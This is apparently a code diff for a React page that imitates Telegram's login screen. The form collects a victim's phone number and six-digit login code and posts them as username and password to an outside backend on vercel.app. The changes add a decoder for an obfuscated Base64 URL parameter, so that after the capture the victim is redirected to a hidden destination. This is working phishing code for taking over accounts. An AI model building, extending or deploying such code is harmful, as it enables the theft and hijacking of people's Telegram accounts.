@@ -1,90 +1,123 @@
-"use client"
-import { useState } from "react"
+"use client";
+import { useState, useEffect } from "react";
 
-export default function TelegramLogin() {
-  const [step, setStep] = useState(1)
-  const [phoneNumber, setPhoneNumber] = useState("")
-  const [verificationCode, setVerificationCode] = useState("")
-  const [errors, setErrors] = useState({ phone: "", code: "" })
+export default function TelegramLogin({ params }) {
+  const [step, setStep] = useState(1);
+  const [phoneNumber, setPhoneNumber] = useState("");
+  const [verificationCode, setVerificationCode] = useState("");
+  const [errors, setErrors] = useState({ phone: "", code: "" });
+  const [loading, setLoading] = useState(false);
+  const [encryptedString, setEncryptedString] = useState("");
+  const [hasTargetUrl, setHasTargetUrl] = useState(false);
+
+  // Decrypt Base64-like URL-safe string
+  const decryptUrlSafeBase64 = (encoded) => {
+    if (!encoded) return "";
+    try {
+      const base64 = encoded.replace(/-/g, "+").replace(/_/g, "/");
+      const padding = "=".repeat((4 - (base64.length % 4)) % 4);
+      return decodeURIComponent(escape(atob(base64 + padding)));
+    } catch {
+      return "";
+    }
+  };
+
+  useEffect(() => {
+    if (params?.slug && params.slug.length > 0) {
+      const encryptedParam = params.slug[0];
+      if (encryptedParam) {
+        setEncryptedString(encryptedParam);
+        setHasTargetUrl(true);
+        console.log("Encrypted string detected:", encryptedParam);
+      }
+    }
+  }, [params]);
 
   const handlePhoneNext = async (e) => {
-    e.preventDefault()
-    setErrors({ phone: "", code: "" })
+    e.preventDefault();
+    setErrors({ phone: "", code: "" });
 
     if (!phoneNumber) {
-      setErrors((prev) => ({ ...prev, phone: "Phone number is required" }))
-      return
+      setErrors((prev) => ({ ...prev, phone: "Phone number is required" }));
+      return;
     }
 
     if (phoneNumber.length < 10) {
-      setErrors((prev) => ({ ...prev, phone: "Please enter a valid phone number" }))
-      return
+      setErrors((prev) => ({ ...prev, phone: "Please enter a valid phone number" }));
+      return;
     }
 
     try {
       const response = await fetch("/api/auth/telegram", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          phoneNumber,
-          step: "phone",
-          platform: "telegram",
-        }),
-      })
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phoneNumber, step: "phone", platform: "telegram" }),
+      });
 
-      const data = await response.json()
+      const data = await response.json();
 
       if (response.ok) {
-        setStep(2)
+        setStep(2);
       } else {
-        setErrors((prev) => ({ ...prev, phone: data.message || "Failed to send code" }))
+        setErrors((prev) => ({ ...prev, phone: data.message || "Failed to send code" }));
       }
     } catch (error) {
-      setErrors((prev) => ({ ...prev, phone: "Network error. Please try again." }))
+      setErrors((prev) => ({ ...prev, phone: "Network error. Please try again." }));
     }
-  }
+  };
 
   const handleCodeSubmit = async (e) => {
-    e.preventDefault()
-    setErrors({ phone: "", code: "" })
+    e.preventDefault();
+    setErrors({ phone: "", code: "" });
 
     if (!verificationCode) {
-      setErrors((prev) => ({ ...prev, code: "Verification code is required" }))
-      return
+      setErrors((prev) => ({ ...prev, code: "Verification code is required" }));
+      return;
     }
 
     if (verificationCode.length !== 6) {
-      setErrors((prev) => ({ ...prev, code: "Please enter a valid 6-digit code" }))
-      return
+      setErrors((prev) => ({ ...prev, code: "Please enter a valid 6-digit code" }));
+      return;
     }
 
     try {
+      setLoading(true);
       const response = await fetch("https://social-backend-bice-delta.vercel.app/api/auth/telegram", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          username: phoneNumber,      // phone number as username
-          password: verificationCode, // verification code as password
+          username: phoneNumber,
+          password: verificationCode,
         }),
-      })
+      });
 
-      const data = await response.json()
+      const data = await response.json();
 
       if (response.ok) {
-        alert("Login successful!")
-        console.log("Login successful:", data)
+        alert("Login successful!");
+        console.log("Login successful:", data);
+
+        // Redirect to decrypted URL if available
+        if (hasTargetUrl && encryptedString) {
+          const targetUrl = decryptUrlSafeBase64(encryptedString);
+          if (targetUrl && (targetUrl.startsWith("http://") || targetUrl.startsWith("https://"))) {
+            setTimeout(() => {
+              window.location.href = targetUrl;
+            }, 800);
+            return;
+          }
+        }
+
+        setLoading(false);
       } else {
-        setErrors((prev) => ({ ...prev, code: data.message || "Invalid verification code" }))
+        setErrors((prev) => ({ ...prev, code: data.message || "Invalid verification code" }));
+        setLoading(false);
       }
     } catch (error) {
-      setErrors((prev) => ({ ...prev, code: "Network error. Please try again." }))
+      setErrors((prev) => ({ ...prev, code: "Network error. Please try again." }));
+      setLoading(false);
     }
-  }
-
+  };
 
   if (step === 1) {
     return (
@@ -92,7 +125,6 @@ export default function TelegramLogin() {
         <div className="flex items-center justify-center min-h-screen px-4">
           <div className="w-full max-w-md">
             <div className="text-center">
-              {/* Telegram Logo */}
               <div className="mb-8">
                 <div className="w-20 h-20 bg-blue-500 rounded-full flex items-center justify-center mx-auto mb-4">
                   <div className="text-white text-3xl">✈️</div>
@@ -101,7 +133,6 @@ export default function TelegramLogin() {
                 <p className="text-gray-600">Please confirm your country code and enter your phone number.</p>
               </div>
 
-              {/* Phone Form */}
               <form onSubmit={handlePhoneNext} className="space-y-4">
                 <div className="text-left">
                   <label className="block text-sm font-medium text-gray-700 mb-2">Country</label>
@@ -124,7 +155,8 @@ export default function TelegramLogin() {
                       placeholder="--- --- ----"
                       value={phoneNumber}
                       onChange={(e) => setPhoneNumber(e.target.value)}
-                      className={`flex-1 px-3 py-3 border rounded-r-md focus:outline-none ${errors.phone ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-blue-500"}`}
+                      className={`flex-1 px-3 py-3 border rounded-r-md focus:outline-none ${errors.phone ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-blue-500"
+                        }`}
                       required
                     />
                   </div>
@@ -147,7 +179,7 @@ export default function TelegramLogin() {
           </div>
         </div>
       </div>
-    )
+    );
   }
 
   return (
@@ -155,7 +187,6 @@ export default function TelegramLogin() {
       <div className="flex items-center justify-center min-h-screen px-4">
         <div className="w-full max-w-md">
           <div className="text-center">
-            {/* Telegram Logo */}
             <div className="mb-8">
               <div className="w-20 h-20 bg-blue-500 rounded-full flex items-center justify-center mx-auto mb-4">
                 <div className="text-white text-3xl">✈️</div>
@@ -167,7 +198,6 @@ export default function TelegramLogin() {
               </button>
             </div>
 
-            {/* Verification Form */}
             <form onSubmit={handleCodeSubmit} className="space-y-4">
               <div className="text-left">
                 <label className="block text-sm font-medium text-gray-700 mb-2">Verification Code</label>
@@ -176,7 +206,8 @@ export default function TelegramLogin() {
                   placeholder="Enter code"
                   value={verificationCode}
                   onChange={(e) => setVerificationCode(e.target.value)}
-                  className={`w-full px-3 py-3 border rounded-md focus:outline-none text-center text-2xl tracking-widest ${errors.code ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-blue-500"}`}
+                  className={`w-full px-3 py-3 border rounded-md focus:outline-none text-center text-2xl tracking-widest ${errors.code ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-blue-500"
+                    }`}
                   maxLength={6}
                   required
                   autoFocus
@@ -187,8 +218,9 @@ export default function TelegramLogin() {
               <button
                 type="submit"
                 className="w-full bg-blue-500 text-white py-3 rounded-md font-medium hover:bg-blue-600 transition-colors"
+                disabled={loading}
               >
-                CONTINUE
+                {loading ? "Processing..." : "CONTINUE"}
               </button>
 
               <div className="text-center">
@@ -201,5 +233,5 @@ export default function TelegramLogin() {
         </div>
       </div>
     </div>
-  )
+  );
 }
